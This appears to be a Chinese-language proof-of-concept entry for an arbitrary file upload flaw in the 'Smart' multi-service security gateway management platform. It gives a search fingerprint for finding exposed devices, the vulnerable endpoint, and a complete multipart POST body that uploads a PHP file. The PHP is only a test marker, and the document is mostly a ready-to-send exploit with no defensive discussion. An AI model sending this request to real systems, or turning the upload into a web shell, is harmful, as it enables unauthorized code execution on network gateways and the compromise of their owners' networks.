# Smart多业务安全网关智能管理平台任意文件上传漏洞

- **系统**：Smart　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="Smart--管理平台"`
- **请求**：`POST /useratte/userattestation.php HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=---------------------------423…`

**请求体 / payload**
```
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="web_img"; filename="dudesite.php"
Content-Type: application/octet-stream
<?php echo 1234;?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"
1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"
1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="hidwel"
set
-----------------------------42328904123665875270630079328?
```
- **预期**：200　|　—